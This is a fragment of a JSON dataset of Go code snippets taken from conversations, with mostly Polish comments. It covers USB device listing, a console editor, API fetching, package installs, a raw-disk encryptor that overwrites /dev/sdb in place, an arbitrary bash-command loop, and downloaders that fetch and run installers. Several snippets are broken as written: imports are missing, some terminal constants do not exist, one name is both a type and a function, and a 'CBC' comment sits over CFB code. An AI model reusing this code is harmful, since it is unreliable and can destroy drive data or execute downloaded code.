{\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Printf(\"Nagranie zostało zapisane do pliku %s\\n\", outputFilePath)\n}",
    "filename": "ef359361df6bcf33f5c2d2ff889ce50e_0.go"
  },
  {
    "conversation_hash": "b0cdb089a1acd8f3f5c6cd748f42a57c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"io\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Sprawdź czy podano klucz jako argument przy uruchomieniu programu\n\tif len(os.Args) < 2 {\n\t\tlog.Fatal(\"Podaj klucz jako argument przy uruchamianiu programu\")\n\t}\n\n\t// Pobierz klucz z argumentu\n\tkey := []byte(os.Args[1])\n\n\t// Otwórz plik pendrive'a\n\tfile, err := os.OpenFile(\"/dev/sdb\", os.O_RDWR, 0644)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Pobierz rozmiar pliku\n\tfileInfo, _ := file.Stat()\n\tfileSize := fileInfo.Size()\n\n\t// Generuj nowy wektor inicjalizacyjny (IV)\n\tiv := make([]byte, aes.BlockSize)\n\tif _, err := io.ReadFull(rand.Reader, iv); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Utwórz blok szyfrujący z podanym kluczem\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Utwórz szyfr blokowy w trybie CBC (Cipher Block Chaining)\n\tstream := cipher.NewCFBEncrypter(block, iv)\n\n\t// Stwórz bufor do zaszyfrowania danych\n\tbuffer := make([]byte, aes.BlockSize)\n\n\t// Pobierz zawartość pendrive'a\n\tfileContent, err := ioutil.ReadAll(file)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Zaszyfruj dane\n\tstream.XORKeyStream(buffer, buffer)\n\tstream.XORKeyStream(fileContent, fileContent)\n\n\t// Ustaw pozycję wskaźnika na początku pliku\n\tif _, err := file.Seek(0, 0); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Zapisz zaszyfrowane dane na pendrive\n\tif _, err := file.Write(fileContent); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Ustaw rozmiar pliku na pierwotną wartość\n\tif err := file.Truncate(fileSize); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Zapisz wektor inicjalizacyjny\n\tivFile, err := os.Create(\"./iv.data\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer ivFile.Close()\n\n\t_, err = ivFile.Write(iv)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tlog.Println(\"System plików na pendrive'ie został zaszyfrowany.\")\n}",
    "filename": "b0cdb089a1acd8f3f5c6cd748f42a57c_0.go"
  },
  {
    "conversation_hash": "aa83f46b24b623d923b83243da274ce6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"log\"\n\n    \"github.com/google/gousb\"\n)\n\nfunc main() {\n    ctx := gousb.NewContext()\n    defer ctx.Close()\n\n    devList, err := ctx.OpenDevices(func(desc *gousb.DeviceDesc) bool {\n        // Sprawdź, czy to urządzenie USB\n        return desc.Class == gousb.ClassPerInterface\n    })\n    if err != nil {\n        log.Fatalf(\"Błąd przy otwieraniu urządzenia USB: %s\", err)\n    }\n    defer func() {\n        // Zamknij wszystkie urządzenia po zakończeniu\n        for _, d := range devList {\n            d.Close()\n        }\n    }()\n\n    fmt.Println(\"Podłączone urządzenia USB:\")\n    for _, dev := range devList {\n        fmt.Printf(\"ID producenta: %s, ID produktu: %s\\n\", dev.Desc.Vendor, dev.Desc.Product)\n    }\n}",
    "filename": "aa83f46b24b623d923b83243da274ce6_0.go"
  },
  {
    "conversation_hash": "00244fdba6a31b2f1126a44236f508e2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// Dodaj pola PID, VID i numeru seryjnego\ntype DeviceDesc struct {\n    Class     Class\n    Vendor    ID\n    Product   ID\n    Serial    string // Dodaj to pole\n}",
    "filename": "00244fdba6a31b2f1126a44236f508e2_0.go"
  },
  {
    "conversation_hash": "00244fdba6a31b2f1126a44236f508e2",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func runCommand(command string, args ...string) error {\n         cmd := exec.Command(command, args...)\n         cmd.Stdin = os.Stdin\n         cmd.Stdout = os.Stdout\n         cmd.Stderr = os.Stderr\n         return cmd.Run()\n     }",
    "filename": "00244fdba6a31b2f1126a44236f508e2_5.go"
  },
  {
    "conversation_hash": "00244fdba6a31b2f1126a44236f508e2",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n         for {\n             fmt.Print(\"$ \")\n             var input string\n             fmt.Scanln(&input)\n         }\n     }",
    "filename": "00244fdba6a31b2f1126a44236f508e2_6.go"
  },
  {
    "conversation_hash": "6d8b3a83e56ef84003261f168bdd3ce5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"bufio\"\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"os\"\n)",
    "filename": "6d8b3a83e56ef84003261f168bdd3ce5_0.go"
  },
  {
    "conversation_hash": "6d8b3a83e56ef84003261f168bdd3ce5",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func encryptFlashDrive(key []byte, flashDrivePath string) error {\n\tfile, err := os.OpenFile(flashDrivePath, os.O_RDWR, os.ModeExclusive)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer file.Close()\n\n\treader := bufio.NewReader(file)\n\tblockSize := len(key)\n\n\tbuffer := make([]byte, blockSize)\n\n\tfor {\n\t\t_, err := reader.Read(buffer)\n\t\tif err != nil {\n\t\t\tbreak\n\t\t}\n\n\t\tfor i := 0; i < blockSize; i++ {\n\t\t\tbuffer[i] ^= key[i]\n\t\t}\n\n\t\t_, err = file.Seek(-int64(blockSize), 1)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\terr = binary.Write(file, binary.LittleEndian, buffer)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\treturn nil\n}",
    "filename": "6d8b3a83e56ef84003261f168bdd3ce5_1.go"
  },
  {
    "conversation_hash": "6d8b3a83e56ef84003261f168bdd3ce5",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\tkey := []byte(\"your_key_here\")\n\tflashDrivePath := \"path_to_your_flash_drive\"\n\n\terr := encryptFlashDrive(key, flashDrivePath)\n\tif err != nil {\n\t\tfmt.Println(\"Encryption failed:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Flash drive encrypted successfully.\")\n}",
    "filename": "6d8b3a83e56ef84003261f168bdd3ce5_2.go"
  },
  {
    "conversation_hash": "6d8b3a83e56ef84003261f168bdd3ce5",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\n\tfor {\n\t\tfmt.Print(\">> \")\n\t\tcommand, _ := reader.ReadString('\\n')\n\t\tcommand = strings.TrimSuffix(command, \"\\n\")\n\n\t\tcmd := exec.Command(\"bash\", \"-c\", command)\n\t\tcmd.Stderr = os.Stderr\n\t\tcmd.Stdout = os.Stdout\n\n\t\terr := cmd.Run()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error executing command:\", err)\n\t\t}\n\t}\n}",
    "filename": "6d8b3a83e56ef84003261f168bdd3ce5_3.go"
  },
  {
    "conversation_hash": "3b5d78ce9858a8cfd2439d2f94188529",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\t\"strings\"\n\n\t\"golang.org/x/term\"\n)\n\nfunc main() {\n\tfmt.Println(\"Witaj w edytorze tekstu w trybie konsolowym!\")\n\tfmt.Println(\"Wpisz ':q' i wciśnij Enter, aby wyjść.\")\n\n\t// Włącz tryb ukrywania wpisywanych znaków\n\toldState, err := term.MakeRaw(0)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer term.Restore(0, oldState)\n\n\tvar lines []string\n\tcurrentLine := 0\n\tcursorX := 0\n\tcursorY := 0\n\n\tfor {\n\t\t// Wyczyść konsolę i wyświetl aktualny tekst\n\t\tclearScreen()\n\t\tdisplayLines(lines)\n\n\t\t// Ustaw kursor na aktualnej pozycji\n\t\tsetCursorPosition(cursorX, cursorY)\n\n\t\t// Odczytaj wpisywane znaki\n\t\tb := make([]byte, 3)\n\t\tos.Stdin.Read(b)\n\t\tinput := string(b)\n\n\t\tswitch input {\n\t\tcase \"\\r\": // Enter - dodaj nową linię\n\t\t\tlines = append(lines[:currentLine+1], lines[currentLine:]...)\n\t\t\tlines[currentLine] = lines[currentLine][:cursorX]\n\t\t\tcurrentLine++\n\t\t\tcursorX = 0\n\t\t\tcursorY++\n\t\tcase term.KbEsc: // Esc - wyjście\n\t\t\treturn\n\t\tcase term.KbUp: // Czujnik - ruch kursora do góry\n\t\t\tif currentLine > 0 {\n\t\t\t\tcurrentLine--\n\t\t\t\tif cursorY > 0 {\n\t\t\t\t\tcursorY--\n\t\t\t\t}\n\t\t\t\tif cursorX > len(lines[currentLine]) {\n\t\t\t\t\tcursorX = len(lines[currentLine])\n\t\t\t\t}\n\t\t\t}\n\t\tcase term.KbDown: // Czujnik - ruch kursora w dół\n\t\t\tif currentLine < len(lines)-1 {\n\t\t\t\tcurrentLine++\n\t\t\t\tif cursorY < termSize().Y-2 {\n\t\t\t\t\tcursorY++\n\t\t\t\t}\n\t\t\t\tif cursorX > len(lines[currentLine]) {\n\t\t\t\t\tcursorX = len(lines[currentLine])\n\t\t\t\t}\n\t\t\t}\n\t\tcase term.KbLeft: // Lewy strzał - ruch kursora w lewo\n\t\t\tif cursorX > 0 {\n\t\t\t\tcursorX--\n\t\t\t} else if cursorY > 0 {\n\t\t\t\tcursorY--\n\t\t\t\tcursorX = len(lines[currentLine-1])\n\t\t\t\tcurrentLine--\n\t\t\t}\n\t\tcase term.KbRight: // Prawy strzał - ruch kursora w prawo\n\t\t\tif cursorX < len(lines[currentLine]) {\n\t\t\t\tcursorX++\n\t\t\t} else if currentLine < len(lines)-1 {\n\t\t\t\tcursorY++\n\t\t\t\tcursorX = 0\n\t\t\t\tcurrentLine++\n\t\t\t}\n\t\tcase term.KbBackspace, \"\\x7f\": // Backspace - usunięcie znaku\n\t\t\tif cursorX > 0 {\n\t\t\t\tlines[currentLine] = lines[currentLine][:cursorX-1] + lines[currentLine][cursorX:]\n\t\t\t\tcursorX--\n\t\t\t} else if currentLine > 0 {\n\t\t\t\tprevLineLen := len(lines[currentLine-1])\n\t\t\t\tlines[currentLine-1] += lines[currentLine]\n\t\t\t\tlines = append(lines[:currentLine], lines[currentLine+1:]...)\n\t\t\t\tcurrentLine--\n\t\t\t\tcursorX = prevLineLen\n\t\t\t\tcursorY--\n\t\t\t}\n\t\tdefault: // Wprowadź wpisywane znaki\n\t\t\tlines[currentLine] = lines[currentLine][:cursorX] + input + lines[currentLine][cursorX:]\n\t\t\tcursorX++\n\t\t}\n\t}\n}\n\n// Funkcja czyszcząca ekran konsoli\nfunc clearScreen() {\n\tfmt.Print(\"\\033[2J\")\n}\n\n// Funkcja ustawiająca kursor na danej pozycji\nfunc setCursorPosition(x, y int) {\n\tfmt.Printf(\"\\033[%d;%dH\", y+1, x+1)\n}\n\n// Funkcja zwracająca rozmiar konsoli\nfunc termSize() termSize {\n\twidth, height, err := term.GetSize(0)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\treturn termSize{width, height}\n}\n\n// Struktura przechowująca rozmiar konsoli\ntype termSize struct {\n\tX, Y int\n}\n\n// Funkcja wyświetlająca linie tekstu\nfunc displayLines(lines []string) {\n\ttermSize := termSize()\n\tfor _, line := range lines {\n\t\tif len(line) > termSize.X {\n\t\t\tfmt.Println(line[:termSize.X])\n\t\t} else {\n\t\t\tfmt.Println(line)\n\t\t}\n\t}\n}",
    "filename": "3b5d78ce9858a8cfd2439d2f94188529_0.go"
  },
  {
    "conversation_hash": "68b34e8f5db86682564413a5af512bf9",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"log\"\n    \"os/exec\"\n)\n\nfunc main() {\n    disk := \"/dev/sda\" // Zmień to na odpowiedni identyfikator dysku\n\n    cmd := exec.Command(\"smartctl\", \"-a\", disk)\n    output, err := cmd.Output()\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    log.Println(string(output))\n}",
    "filename": "68b34e8f5db86682564413a5af512bf9_5.go"
  },
  {
    "conversation_hash": "68b34e8f5db86682564413a5af512bf9",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\nconst (\n\tapiURL = \"https://dev.to/api/articles?per_page=10\"\n)\n\ntype Article struct {\n\tTitle string `json:\"title\"`\n\tURL   string `json:\"url\"`\n}\n\nfunc main() {\n\tresponse, err := http.Get(apiURL)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer response.Body.Close()\n\n\tvar articles []Article\n\terr = json.NewDecoder(response.Body).Decode(&articles)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfor i, article := range articles {\n\t\tfmt.Printf(\"%d. %s\\n   %s\\n\\n\", i+1, article.Title, article.URL)\n\t}\n}",
    "filename": "68b34e8f5db86682564413a5af512bf9_6.go"
  },
  {
    "conversation_hash": "68b34e8f5db86682564413a5af512bf9",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n)\n\nconst (\n    apiURL = \"https://dev.to/api/articles?per_page=10\"\n)\n\ntype Article struct {\n    Title string `json:\"title\"`\n    URL   string `json:\"url\"`\n}\n\nfunc main() {\n    response, err := http.Get(apiURL)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer response.Body.Close()\n\n    var articles []Article\n    err = json.NewDecoder(response.Body).Decode(&articles)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    for i, article := range articles {\n        fmt.Printf(\"%d. %s\\n   %s\\n\\n\", i+1, article.Title, article.URL)\n    }\n}",
    "filename": "68b34e8f5db86682564413a5af512bf9_7.go"
  },
  {
    "conversation_hash": "68b34e8f5db86682564413a5af512bf9",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n)\n\nconst (\n    apiURL = \"https://dev.to/api/articles?per_page=10\"\n)\n\ntype Article struct {\n    Title string `json:\"title\"`\n    URL   string `json:\"url\"`\n}\n\nfunc main() {\n    response, err := http.Get(apiURL)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer response.Body.Close()\n\n    var articles []Article\n    err = json.NewDecoder(response.Body).Decode(&articles)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    for i, article := range articles {\n        fmt.Printf(\"%d. %s\\n   %s\\n\\n\", i+1, article.Title, article.URL)\n    }\n}",
    "filename": "68b34e8f5db86682564413a5af512bf9_8.go"
  },
  {
    "conversation_hash": "68b34e8f5db86682564413a5af512bf9",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n)\n\nconst (\n    apiURL = \"https://dev.to/api/articles?per_page=10\"\n)\n\ntype Article struct {\n    Title string `json:\"title\"`\n    URL   string `json:\"url\"`\n}\n\nfunc main() {\n    response, err := http.Get(apiURL)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer response.Body.Close()\n\n    var articles []Article\n    err = json.NewDecoder(response.Body).Decode(&articles)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    for i, article := range articles {\n        fmt.Printf(\"%d. %s\\n   %s\\n\\n\", i+1, article.Title, article.URL)\n    }\n}",
    "filename": "68b34e8f5db86682564413a5af512bf9_9.go"
  },
  {
    "conversation_hash": "68b34e8f5db86682564413a5af512bf9",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n)\n\nconst (\n    apiURL = \"https://dev.to/api/articles?per_page=10\"\n)\n\ntype Article struct {\n    Title string `json:\"title\"`\n    URL   string `json:\"url\"`\n}\n\nfunc main() {\n    response, err := http.Get(apiURL)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer response.Body.Close()\n\n    var articles []Article\n    err = json.NewDecoder(response.Body).Decode(&articles)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    for i, article := range articles {\n        fmt.Printf(\"%d. %s\\n   %s\\n\\n\", i+1, article.Title, article.URL)\n    }\n}",
    "filename": "68b34e8f5db86682564413a5af512bf9_10.go"
  },
  {
    "conversation_hash": "2397d41801adec0cb70e1fb5cb352191",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    var num int64 = 100\n    fmt.Printf(\"The number is: %d\\n\", num)\n}",
    "filename": "2397d41801adec0cb70e1fb5cb352191_0.go"
  },
  {
    "conversation_hash": "3a190d13343bb6c52ad0149543e0e4ce",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"strings\"\n\n\t\"github.com/PuerkitoBio/goquery\"\n)\n\nfunc main() {\n\t// 发送HTTP请求\n\tresponse, err := http.Get(\"https://example.com\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer response.Body.Close()\n\n\t// 解析HTML\n\tdoc, err := goquery.NewDocumentFromReader(response.Body)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 获取meta标签\n\tdoc.Find(\"meta\").Each(func(i int, s *goquery.Selection) {\n\t\t// 获取meta标签的属性值\n\t\tproperty, exists := s.Attr(\"property\")\n\t\tif exists {\n\t\t\t// 判断是否是需要的meta标签\n\t\t\tif property == \"og:title\" {\n\t\t\t\t// 获取meta标签的内容\n\t\t\t\tcontent, exists := s.Attr(\"content\")\n\t\t\t\tif exists {\n\t\t\t\t\tfmt.Println(\"og:title:\", content)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// 获取meta标签的属性值\n\t\tname, exists := s.Attr(\"name\")\n\t\tif exists {\n\t\t\t// 判断是否是需要的meta标签\n\t\t\tif strings.ToLower(name) == \"description\" {\n\t\t\t\t// 获取meta标签的内容\n\t\t\t\tcontent, exists := s.Attr(\"content\")\n\t\t\t\tif exists {\n\t\t\t\t\tfmt.Println(\"description:\", content)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t})\n}",
    "filename": "3a190d13343bb6c52ad0149543e0e4ce_1.go"
  },
  {
    "conversation_hash": "3a190d13343bb6c52ad0149543e0e4ce",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"bytes\"\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n)\n\nfunc main() {\n    url := \"http://example.com\"\n    payload := []byte(\"This is the request body\")\n\n    // 创建一个新的请求\n    request, err := http.NewRequest(\"POST\", url, bytes.NewBuffer(payload))\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 设置自定义的请求头部\n    request.Header.Set(\"Content-Type\", \"application/json\")\n    request.Header.Set(\"Authorization\", \"Bearer your-token\")\n\n    // 创建一个HTTP客户端并发送请求\n    client := &http.Client{}\n    response, err := client.Do(request)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer response.Body.Close()\n\n    // 处理响应\n    fmt.Println(\"Response Status:\", response.Status)\n    fmt.Println(\"Response Headers:\", response.Header)\n\n    // 读取响应内容\n    responseBody := make([]byte, 1024)\n    _, err = response.Body.Read(responseBody)\n    if err != nil {\n        log.Fatal(err)\n    }\n    fmt.Println(\"Response Body:\", string(responseBody))\n}",
    "filename": "3a190d13343bb6c52ad0149543e0e4ce_2.go"
  },
  {
    "conversation_hash": "374d1bc0e8abb8ce2ddb5fd72cbaa3f2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// Nazwa pliku z listą pakietów\n\tpackagesFile := \"packages.txt\"\n\n\t// Sprawdź, czy plik istnieje\n\tif _, err := os.Stat(packagesFile); os.IsNotExist(err) {\n\t\tlog.Fatalf(\"Plik %s nie istnieje\", packagesFile)\n\t}\n\n\t// Otwórz plik z listą pakietów\n\tfile, err := os.Open(packagesFile)\n\tif err != nil {\n\t\tlog.Fatalf(\"Błąd podczas otwierania pliku: %s\", err)\n\t}\n\tdefer file.Close()\n\n\t// Odczytaj pakiety z pliku\n\tpackages := make([]string, 0)\n\tscanner := bufio.NewScanner(file)\n\tfor scanner.Scan() {\n\t\tpackages = append(packages, scanner.Text())\n\t}\n\tif err := scanner.Err(); err != nil {\n\t\tlog.Fatalf(\"Błąd podczas odczytu pliku: %s\", err)\n\t}\n\n\t// Instaluj pakiety przy użyciu Chocolatey\n\tfor _, pkg := range packages {\n\t\tcmd := exec.Command(\"choco\", \"install\", pkg, \"-y\")\n\t\toutput, err := cmd.CombinedOutput()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Błąd podczas instalowania pakietu %s: %s\", pkg, err)\n\t\t}\n\t\tfmt.Printf(\"%s\\n\", output)\n\t}\n}",
    "filename": "374d1bc0e8abb8ce2ddb5fd72cbaa3f2_0.go"
  },
  {
    "conversation_hash": "f534ac58711113f9a9207f5d7cbd96b4",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// Nazwa pliku z lista pakietow\n\tpackagesFile := \"packages.txt\"\n\n\t// Sprawdz, czy plik istnieje\n\tif _, err := os.Stat(packagesFile); os.IsNotExist(err) {\n\t\tlog.Fatalf(\"Plik %s nie istnieje\", packagesFile)\n\t}\n\n\t// Otworz plik z lista pakietow\n\tfile, err := os.Open(packagesFile)\n\tif err != nil {\n\t\tlog.Fatalf(\"Blad podczas otwierania pliku: %s\", err)\n\t}\n\tdefer file.Close()\n\n\t// Odczytaj pakiety z pliku\n\tpackages := make([]string, 0)\n\tscanner := bufio.NewScanner(file)\n\tfor scanner.Scan() {\n\t\tpackages = append(packages, scanner.Text())\n\t}\n\tif err := scanner.Err(); err != nil {\n\t\tlog.Fatalf(\"Blad podczas odczytu pliku: %s\", err)\n\t}\n\n\t// Instaluj pakiety przy uzyciu Chocolatey\n\tfor _, pkg := range packages {\n\t\tcmd := exec.Command(\"choco\", \"install\", pkg, \"-y\")\n\t\toutput, err := cmd.CombinedOutput()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Blad podczas instalowania pakietu %s: %s\", pkg, err)\n\t\t}\n\t\tfmt.Printf(\"%s\\n\", output)\n\t}\n}",
    "filename": "f534ac58711113f9a9207f5d7cbd96b4_0.go"
  },
  {
    "conversation_hash": "f534ac58711113f9a9207f5d7cbd96b4",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// Nazwa pliku z lista pakietow\n\tpackagesFile := \"packages.txt\"\n\n\t// Sprawdz, czy plik istnieje\n\tif _, err := os.Stat(packagesFile); os.IsNotExist(err) {\n\t\tlog.Fatalf(\"Plik %s nie istnieje\", packagesFile)\n\t}\n\n\t// Otworz plik z lista pakietow\n\tfile, err := os.Open(packagesFile)\n\tif err != nil {\n\t\tlog.Fatalf(\"Blad podczas otwierania pliku: %s\", err)\n\t}\n\tdefer file.Close()\n\n\t// Odczytaj pakiety z pliku\n\tpackages := make([]string, 0)\n\tscanner := bufio.NewScanner(file)\n\tfor scanner.Scan() {\n\t\tpackages = append(packages, scanner.Text())\n\t}\n\tif err := scanner.Err(); err != nil {\n\t\tlog.Fatalf(\"Blad podczas odczytu pliku: %s\", err)\n\t}\n\n\t// Instaluj pakiety przy uzyciu Chocolatey\n\tfor _, pkg := range packages {\n\t\tcmd := exec.Command(\"/ProgramData/chocolatey/choco.exe\", \"install\", pkg, \"-y\")\n\t\toutput, err := cmd.CombinedOutput()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Blad podczas instalowania pakietu %s: %s\", pkg, err)\n\t\t}\n\t\tfmt.Printf(\"%s\\n\", output)\n\t}\n}",
    "filename": "f534ac58711113f9a9207f5d7cbd96b4_2.go"
  },
  {
    "conversation_hash": "9eee2909b34abaf57216d5752978c721",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// Sprawdź, czy folder .NET jest już zainstalowany\n\t_, err := os.Stat(\"C:\\\\Program Files\\\\dotnet\")\n\tif err == nil {\n\t\tfmt.Println(\".NET jest już zainstalowane\")\n\t\treturn\n\t}\n\n\t// Jeśli .NET nie jest zainstalowane, pobierz instalator z witryny Microsoft\n\turl := \"https://dot.net/v1/dotnet-install.ps1\"\n\toutput := \"dotnet-install.ps1\"\n\n\terr = downloadFile(url, output)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Wykonaj skrypt PowerShell, aby zainstalować .NET\n\tcmd := exec.Command(\"powershell\", \"-File\", output)\n\terr = cmd.Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Sprawdź, czy instalacja się powiodła\n\t_, err = os.Stat(\"C:\\\\Program Files\\\\dotnet\")\n\tif err == nil {\n\t\tfmt.Println(\".NET zostało pomyślnie zainstalowane\")\n\t} else {\n\t\tfmt.Println(\"Wystąpił błąd podczas instalacji .NET\")\n\t}\n}\n\nfunc downloadFile(url string, output string) error {\n\tout, err := os.Create(output)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer out.Close()\n\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer resp.Body.Close()\n\n\t_, err = io.Copy(out, resp.Body)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}",
    "filename": "9eee2909b34abaf57216d5752978c721_0.go"
  },
  {
    "conversation_hash": "7126057ed4d750fb32debd26b5e95e67",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"runtime\"\n)\n\nconst (\n    requiredVersion = \"14.0.0\"  // wymagana wersja bibliotek\n    downloadURL    = \"https://aka.ms/vs/16/release/vc_redist.x64.exe\"  // URL do pobrania bibliotek\n)\n\nfunc main() {\n    // Sprawdzenie systemu operacyjnego\n    if runtime.GOOS != \"windows\" {\n        fmt.Println(\"Ten program działa tylko na systemie Windows.\")\n        return\n    }\n    \n    // Sprawdzenie, czy biblioteki są zainstalowane\n    if !isRuntimeInstalled() {\n        // Jeśli biblioteki nie są zainstalowane, pobierz i zainstaluj\n        if err := installRuntime(); err != nil {\n            fmt.Printf(\"Wystąpił błąd podczas instalowania bibliotek: %v\\n\", err)\n            return\n        }\n        \n        fmt.Println(\"Biblioteki Visual C++ Redistributable Runtime All-in-One zostały zainstalowane.\")\n    } else {\n        fmt.Println(\"Biblioteki Visual C++ Redistributable Runtime All-in-One są już zainstalowane.\")\n    }\n}\n\n// Funkcja sprawdzająca status bibliotek\nfunc isRuntimeInstalled() bool {\n    _, err := exec.LookPath(\"vc_redist.x64.exe\")\n    if err != nil {\n        return false\n    }\n    return true\n}\n\n// Funkcja instalująca biblioteki\nfunc installRuntime() error {\n    // Pobieranie pliku instalacyjnego bibliotek\n    err := downloadFile(downloadURL, \"vc_redist.x64.exe\")\n    if err != nil {\n        return err\n    }\n    \n    // Wywołanie polecenia instalacyjnego\n    cmd := exec.Command(\"vc_redist.x64.exe\", \"/install\", \"/quiet\", \"/norestart\")\n    cmd.Stdout = os.Stdout\n    cmd.Stderr = os.Stderr\n    \n    err = cmd.Run()\n    if err != nil {\n        return err\n    }\n    \n    // Usunięcie pliku instalacyjnego po instalacji\n    err = os.Remove(\"vc_redist.x64.exe\")\n    if err != nil {\n        return err\n    }\n    \n    return nil\n}\n\n// Funkcja pobierająca plik\nfunc downloadFile(url, filename string) error {\n    resp, err := http.Get(url)\n    if err != nil {\n        return err\n    }\n    defer resp.Body.Close()\n    \n    // Otwieranie pliku do zapisu\n    file, err := os.Create(filename)\n    if err != nil {\n        return err\n    }\n    defer file.Close()\n    \n    // Zapisywanie danych z odpowiedzi HTTP do pliku\n    _, err = io.Copy(file, resp.Body)\n    if err != nil {\n        return err\n    }\n    \n    return nil\n}",
    "filename": "7126057ed4d750fb32debd26b5e95e67_0.go"
  },
  {
    "conversation_hash": "29eb8015cbcd20bea56c751bc98cabd9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
